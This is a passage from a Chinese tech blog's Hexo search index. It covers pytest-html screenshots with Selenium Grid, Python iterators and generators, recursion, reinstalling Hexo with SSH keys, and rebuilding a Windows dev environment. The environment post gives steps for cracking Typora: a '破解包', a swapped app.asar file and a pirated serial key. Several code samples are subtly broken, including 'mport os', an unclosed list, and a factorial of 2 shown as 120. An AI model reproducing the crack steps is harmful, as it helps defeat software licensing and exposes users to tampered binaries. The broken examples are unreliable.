item:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _driver:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    pytest_html = item.config.pluginmanager.getplugin(<span class="string">&#x27;html&#x27;</span>)</span><br><span class="line">    outcome = <span class="keyword">yield</span></span><br><span class="line">    report = outcome.get_result()</span><br><span class="line">    report.description = <span class="built_in">str</span>(item.function.__doc__)</span><br><span class="line">    extra = <span class="built_in">getattr</span>(report, <span class="string">&#x27;extra&#x27;</span>, [])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> report.when == <span class="string">&#x27;call&#x27;</span> <span class="keyword">or</span> report.when == <span class="string">&quot;setup&quot;</span>:</span><br><span class="line">        xfail = <span class="built_in">hasattr</span>(report, <span class="string">&#x27;wasxfail&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (report.skipped <span class="keyword">and</span> xfail) <span class="keyword">or</span> (report.failed <span class="keyword">and</span> <span class="keyword">not</span> xfail):</span><br><span class="line">            screen_img = _capture_screenshot()</span><br><span class="line">            <span class="keyword">if</span> screen_img:</span><br><span class="line">                html = <span class="string">&#x27;&lt;div&gt;&lt;img src=&quot;data:image/png;base64,%s&quot; alt=&quot;screenshot&quot; style=&quot;width:1024px;height:768px;&quot; &#x27;</span> \</span><br><span class="line">                       <span class="string">&#x27;onclick=&quot;window.open(this.src)&quot; align=&quot;right&quot;/&gt;&lt;/div&gt;&#x27;</span> % screen_img</span><br><span class="line">                extra.append(pytest_html.extras.html(html))</span><br><span class="line">        report.extra = extra</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_header</span>(<span class="params">cells</span>):</span><br><span class="line">    cells.insert(<span class="number">1</span>, html.th(<span class="string">&#x27;用例名称&#x27;</span>))</span><br><span class="line">    cells.insert(<span class="number">2</span>, html.th(<span class="string">&#x27;Test_nodeid&#x27;</span>))</span><br><span class="line">    cells.pop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_row</span>(<span class="params">report, cells</span>):</span><br><span class="line">    cells.insert(<span class="number">1</span>, html.td(report.description))</span><br><span class="line">    cells.insert(<span class="number">2</span>, html.td(report.nodeid))</span><br><span class="line">    cells.pop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_html</span>(<span class="params">report, data</span>):</span><br><span class="line">    <span class="keyword">if</span> report.passed:</span><br><span class="line">        <span class="keyword">del</span> data[:]</span><br><span class="line">        data.append(html.div(<span class="string">&#x27;通过的用例未捕获日志输出.&#x27;</span>, class_=<span class="string">&#x27;empty log&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_report_title</span>(<span class="params">report</span>):</span><br><span class="line">    report.title = <span class="string">&quot;pytest示例项目测试报告&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_capture_screenshot</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    截图保存为base64</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _driver.get_screenshot_as_base64()</span><br></pre></td></tr></table></figure>

<ul>
<li>用例编写</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># test_selenium.py</span><br><span class="line"></span><br><span class="line">mport os</span><br><span class="line">import time</span><br><span class="line">import pytest</span><br><span class="line"></span><br><span class="line">class TestCase(object):</span><br><span class="line">    @pytest.mark.finished</span><br><span class="line">    def test_001(self, driver):</span><br><span class="line">        time.sleep(3)</span><br><span class="line">        driver.get(&quot;https://www.baidu.com&quot;)</span><br><span class="line">        print(driver.title)</span><br><span class="line">        driver.find_element_by_id(&quot;kw&quot;).click()</span><br><span class="line">        driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;你好&quot;)</span><br><span class="line">    def test1_001(self, driver):</span><br><span class="line">        time.sleep(3)</span><br><span class="line">        driver.get(&quot;https://www.baidu.com&quot;)</span><br><span class="line">        print(driver.title)</span><br><span class="line">        driver.find_element_by_id(&quot;kw&quot;).click()</span><br><span class="line">        driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;你好&quot;)</span><br></pre></td></tr></table></figure>



<ul>
<li>代码运行入口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># runner.py</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">import pytest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(path):</span><br><span class="line">	# 这里的-n 3 意思就是同时并发3个用例执行</span><br><span class="line">    pytest.main([&#x27;%s&#x27; %path,&#x27;-n 3&#x27;, &#x27;--html=report.html&#x27;,&#x27;--self-contained-html&#x27;, &#x27;--capture=sys&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 大回归</span><br><span class="line">    test_case = Process(target=main, args=(&quot;d:\\project\\py_selenium_grid\\testcase\\大回归\\&quot;,))</span><br><span class="line">    test_case.start()</span><br><span class="line">    test_case.join()</span><br><span class="line">    # 小回归</span><br><span class="line">    ...</span><br><span class="line">    # 冒烟</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<ul>
<li>看下代码运行结果</li>
</ul>
<p><img src="/aposts/d8b0934a/image-20220325182511617.png" alt="image-20220325182511617"></p>
<ul>
<li>看下本地的测试报告，错误的自动截图</li>
</ul>
<p><img src="/aposts/d8b0934a/image-20220325182640854.png" alt="image-20220325182640854"></p>
<p><img src="/aposts/d8b0934a/image-20220325182619284.png" alt="image-20220325182619284"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><code> pytest-xdist</code> 经过测试，在云服务器（双核）上跑，可以正常跑，如果指定进程太大，会造成容器内存泄漏，服务器出现长期卡死，所以建议：<strong>每次执行任务时，都把容器删了重建，同时进程不要指定太大</strong><ul>
<li>可以进入到<code>docker</code> 容器中排除内存情况：<code>docker exec -it ec3d30bff042 top</code>，其中<code>ec3d30bff042 </code> 是<code>selenium/node-chrome</code> 的镜像</li>
</ul>
</li>
<li>测试了<code>pytest-parallel</code> 这个无论是在服务器还是本地win上跑，都报错</li>
<li>使用了<code>pytest-multithreading</code> 发现个问题<ul>
<li><code>pytest-html</code>上的记录日志，会被打乱，因此如果要使用的化，建议在<code>conftest.py</code>中，记录日志的代码去掉</li>
<li>多线程访问百度网站，会被限制输入验证信息</li>
<li>安装<code>pip install pytest-multithreading -i https://pypi.douban.com/simple</code></li>
<li>调用 <code>pytest -s testcase/大回归/小回归/冒烟 --th 10 --html=report.html --self-contained-html --capture=sys</code></li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>当然如果没有条件，你对本地搭建<code>selenium grid</code>有兴趣的化，可以参考我之前的<a href="/aposts/a266feac">这篇文章</a>，源代码都提供好了</li>
<li>后续工作就更加简单，比如jenkins启动，我会对接一个可视化平台实现：任务管理，报告分析等</li>
</ul>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>自动化测试</tag>
        <tag>docker</tag>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title>迭代器和生成器</title>
    <url>/aposts/12cb96d0/</url>
    <content><![CDATA[<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><ul>
<li>内部含有<code>_iter_</code>方法和<code>_next_</code>方法都是迭代器<ul>
<li>可迭代对象 都可以通过内置函数<code> iter</code>转换为迭代器</li>
<li>内置函数 <code>next</code> 进行迭代操作,当所有数据迭代完毕后，再使用 <code>next</code> 迭代，会抛出异常 <code>StopIteration</code>。</li>
</ul>
</li>
<li>使用<code>for</code>循环<strong>容器</strong>取值的都是<strong>可迭代的</strong></li>
</ul>
<blockquote>
<p>容器就是将多个元素在一起的单元，并且，是可以迭代的，比如列表，字典，元组，字符串</p>
</blockquote>
<ul>
<li>如下代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将列表转换为一个迭代器</span><br><span class="line">iter_li = iter([11,22)</span><br><span class="line"># 通过next对迭代器进行迭代操作，每次可以迭代出来一个数据</span><br><span class="line">s1 = next(iter_li)</span><br><span class="line">print(&#x27;s1:&#x27;,s1)</span><br><span class="line">s2 = next(iter_li) # s1 :11</span><br><span class="line">print(&#x27;s2:&#x27;,s2)  # s2 :22</span><br><span class="line">s3 = next(iter_li)  # StopIteration 错误</span><br></pre></td></tr></table></figure>

<h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><ul>
<li><p>是一种<strong>特殊的迭代器</strong>，具备迭代器所有的特性。但其相比与迭代器，占用的内存更少</p>
</li>
<li><p>他本质上是一个函数，只不过函数的<code>return</code>改为了<code>yield</code>语句，正常的<code>for</code>循环语句，会不停的遍历容器的对象，然后返回（如果有return的话），当我们用<code>yield</code>取而代之</p>
</li>
<li><p>每当函数执行时遇到<code>yield</code>时，他会记住此时的一个位置并挂起，等到使用__next__操作时，才由上一次挂起的位置继续执行。<strong>生成器不仅“记住”了它的数据状态，生成还记住了程序执行的位置</strong></p>
</li>
<li><p>python 中定义生成器，一共有两种方式，一种是生成器表达式，另一种是生成器函数。</p>
</li>
</ul>
<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>生成器表达式的语法其实就是把<strong>列表推导式</strong>的中括号改成小括号，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gen_ =(item <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(gen_)</span><br><span class="line">s1 = <span class="built_in">next</span>(gen_)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="built_in">next</span>(gen_)</span><br><span class="line"><span class="built_in">next</span>(gen_) <span class="comment"># 报错StopIteration</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="生成器函数"><a href="#生成器函数" class="headerlink" title="生成器函数"></a>生成器函数</h3><p>在函数中使用 <code>yield</code>关键字可以定义一个生成器函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line"></span><br><span class="line">gen_list = func()</span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">gen_lsit = func()</span><br><span class="line">s2 = <span class="built_in">next</span>(gen_list)</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line"><span class="built_in">next</span>(gen_list)  <span class="comment"># 报错StopIteration</span></span><br></pre></td></tr></table></figure>

<h3 id="自定义类生成器"><a href="#自定义类生成器" class="headerlink" title="自定义类生成器"></a>自定义类生成器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from collections import Iterable</span><br><span class="line">from collections import Iterator</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Classmate(object):</span><br><span class="line">    &quot;&quot;&quot;定义一个同学类&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = list()</span><br><span class="line">        self.name_num = 0</span><br><span class="line"></span><br><span class="line">    def add(self, name):</span><br><span class="line">        self.name.append(name)</span><br><span class="line"></span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return self  # 返回本身</span><br><span class="line"></span><br><span class="line">    def __next__(self):</span><br><span class="line">        if self.name_num &lt; len(self.name):</span><br><span class="line">            ret = self.name[self.name_num]</span><br><span class="line">            self.name_num += 1</span><br><span class="line">            return ret</span><br><span class="line"></span><br><span class="line">        # 抛出异常，当循环后自动结束</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;-------StopIteration---&quot;)</span><br><span class="line">            raise StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class1 = Classmate()</span><br><span class="line">class1.add(&quot;张三&quot;)</span><br><span class="line">class1.add(&quot;李四&quot;)</span><br><span class="line">class1.add(&quot;王五&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;判断是否是可迭代的对象：&quot;, isinstance(class1, Iterable))</span><br><span class="line"></span><br><span class="line">print(&quot;判断是否是迭代器：&quot;, isinstance(class1, Iterator))</span><br><span class="line"></span><br><span class="line">for name in class1:</span><br><span class="line">    print(name)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    </span><br><span class="line"># 结果为</span><br><span class="line">判断是否是可迭代的对象： True</span><br><span class="line">判断是否是迭代器： True</span><br><span class="line">张三</span><br><span class="line">李四</span><br><span class="line">王五</span><br><span class="line">-------StopIteration---</span><br></pre></td></tr></table></figure>

<h2 id="总结两者的区别"><a href="#总结两者的区别" class="headerlink" title="总结两者的区别"></a>总结两者的区别</h2><ul>
<li>生成器就是迭代器，反之则不是</li>
<li>迭代器，在创建的时候已经生成(比如上面迭代器的列子)，在需要的时候再去操作迭代器<strong>加载元素</strong>到内存中</li>
<li>而生成器，本质是一个可以暂时挂起的函数，等到需要时再继续执行去<strong>生成元素</strong>，这样子，使得生成器比迭代器更省内存。</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>递归算法</title>
    <url>/aposts/5f7017e8/</url>
    <content><![CDATA[<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li>递归算法是一种直接或者间接地调用自身算法的过程，再计算机编写程序中，递归算法对解决一大类问题是十分有效的。</li>
</ul>
<p>　　1、递归就是在过程或函数里调用自身。</p>
<p>　　2、在使用递归策略时，必须有一个明确的递归结束条件，称为递归出口。</p>
<p>　　3、递归算法解题通常显得很简洁，但递归算法解题的运行效率较低。所以一般不提倡用递归算法设计程序。</p>
<p>　　4、在递归调用的过程中系统为每一层的返回点、局部量等开辟了栈来存储。递归次数过多容易造成栈溢出等。</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>　　1、每次调用在规模上都有所缩小（通常是减半）；</p>
<p>　　2、相邻两次重复直接有紧密的联系，前一次要为后一次做准备（通常前一次的输出就作为后一次的输入）；</p>
<p>　　3、在问题的规模极小时必须用直接给出解答而不再进行递归调用，因而每次递归调用都是有条件的，无条件的递归将造成死循环而不能正常结束。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul>
<li>循环求余的值大于1，就除以2</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n/<span class="number">2</span> &gt;<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># print(n)</span></span><br><span class="line">        res = calc(n/<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;res:&#x27;</span>,res)</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line">calc(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line"><span class="number">10</span> <span class="comment"># 初始化值为10</span></span><br><span class="line">-------------</span><br><span class="line"><span class="number">5.0</span> <span class="comment"># 第一次循环， 当10/2 &gt;1，进入了第一次调用自己，得到值为5</span></span><br><span class="line">-------------</span><br><span class="line"><span class="number">2.5</span> <span class="comment"># 第二次循环，当5/2 &gt;1，进入了第一次调用自己，得到值为2.5</span></span><br><span class="line">-------------</span><br><span class="line"><span class="number">1.25</span> <span class="comment"># 第三次循环，当2.5/2 &gt;1，进入了第一次调用自己，得到值为1.25</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终得到三次结果</span></span><br><span class="line">res: <span class="number">1.25</span></span><br><span class="line">res: <span class="number">2.5</span></span><br><span class="line">res: <span class="number">5.0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>阶乘</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">box</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n*box(n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">b = box(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="number">120</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>重装heox的问题</title>
    <url>/aposts/b1138623/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>由于某原因，把node和hexo升级后，造成无法发生文章到服务器了，记录解决方法</li>
<li><a href="/aposts/830a4d3a/">迁移博客到腾讯云</a></li>
</ul>
<h2 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h2><ul>
<li>准备空的文件夹，用hexo进行初始化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init XXXXX/</span><br></pre></td></tr></table></figure>

<ul>
<li>安装依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-helper-live2d --save</span><br><span class="line">npm install hexo-asset-image --save</span><br><span class="line">npm install hexo-tag-cloud --save </span><br><span class="line">npm install hexo-abbrlink --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hexo-asset-image</code>和<code>hexo-abbrlink </code>有冲突，造成图片无法展示，修改<code>asset-image</code>的<code>index.js</code>中代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># E:\moon-full-blog\node_modules\hexo-asset-image\index.js</span><br><span class="line"></span><br><span class="line">//var endPos = link.lastIndexOf(&#x27;.&#x27;);</span><br><span class="line">var endPos = link.lastIndexOf(&#x27;/&#x27;);</span><br></pre></td></tr></table></figure>

<ul>
<li>创建本地的<code>id_rsa.pub</code>的密码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -C &quot;2847XXX@qq.com&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>服务器上新增文件，把本地<code>id_rsa.pub</code>的密码拷贝进去</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ~/.ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 755 ~</span><br><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<ul>
<li>测试本地连接服务器，提示输入密码，注意我的用的root用户名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -v root@82.XX.xx.xx</span><br><span class="line"></span><br><span class="line">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span><br><span class="line">Last login: Fri Aug 26 17:59:47 2022 from 116.128.233.192</span><br><span class="line">Last login: Fri Aug 26 17:59:47 2022 from 116.128.233.192</span><br></pre></td></tr></table></figure>

<ul>
<li><p>然后把本地之前的博客的<code>config.yml</code>，主题文件夹，<code>source</code> 拷贝带最新的博客目录</p>
</li>
<li><p>设置邮箱</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.email &#x27;28477XXX4@qq.com&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>提交到服务器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp;&amp;  hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>重装系统后环境重建总结</title>
    <url>/aposts/eb7d5a01/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>重装系统后，电脑上搭建的很多东西用不了，简单记录</li>
<li>本次系统win10</li>
</ul>
<h2 id="heox"><a href="#heox" class="headerlink" title="heox"></a>heox</h2><ul>
<li>本地搭建了hexo的博客，其中主要用的是node，只要把node的安装目录设置到环境变量中即可</li>
<li>然后再博客的目录，执行<code>hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</code>执行成功</li>
<li>发现使用hexo d 提交到服务器后，内容没有变化，需要如下设置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.email &#x27;284772894@qq.com&#x27;</span><br><span class="line"># 然后提交到服务器</span><br><span class="line">hexo cl &amp;&amp;  hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>



<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><ul>
<li>环境变量设置好了mysql的根目录后，直接开启服务提示无效</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net start mysqld</span><br><span class="line">服务名无效。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>分别执行如下操作</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将mysql服务注册到win服务中</span></span><br><span class="line">C:\Users\Administrator&gt;mysqld --initialize</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装服务</span></span><br><span class="line">C:\Users\Administrator&gt;mysqld --install</span><br><span class="line">Service successfully installed.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">C:\Users\Administrator&gt;net start mysql</span><br><span class="line">MySQL 服务正在启动 .</span><br><span class="line">MySQL 服务已经启动成功。</span><br></pre></td></tr></table></figure>

<ul>
<li>最终用<code>heidisql</code>连接数据库成功，库里面的数据正常</li>
</ul>
<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul>
<li>直接在环境变量中设置python的根目录和<code>Script</code>目录</li>
<li>设置pip下载为国内镜像</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 临时使用</span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple xxx</span><br><span class="line"># 永久使用，清华镜像</span><br><span class="line">C:\Users\Administrator&gt;pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">Writing to C:\Users\Administrator\AppData\Roaming\pip\pip.ini</span><br></pre></td></tr></table></figure>

<ul>
<li>测试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;pip install pip -U</span><br><span class="line">Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">Requirement already satisfied: pip in d:\app\python37\lib\site-packages (23.1.2)</span><br></pre></td></tr></table></figure>

<h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><ul>
<li>需要安装node.js，安装hexo 时已经安装了node.js</li>
<li>打开本地的<code>Microsoft VS Code IDE</code> 然后打开本地项目</li>
<li>打开终端执行安装依赖</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<ul>
<li>运行代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<h2 id="typora"><a href="#typora" class="headerlink" title="typora"></a>typora</h2><ul>
<li><p>下载并解压<code>typora1.2.4-Windows(破解包).7z</code></p>
</li>
<li><p>安装后，不打开typora</p>
</li>
<li><p>使用<code>app.asar</code> 文件替换<code>typora_home/resources </code>中文件</p>
</li>
<li><p>打开typora输入任意邮箱，序列号输入：<code>E8Q9Y5-KXMTL5-7578SL-4S5XKS</code></p>
</li>
</ul>
<h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><ul>
<li>设置<code>go_home\bin</code>到环境变量中</li>
<li>启动本地的Microsoft VS Code IDE，打开扩展安装中文</li>
<li>打开go项目文件夹，终端中输入：<code>go run main.go</code></li>
</ul>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
</search>
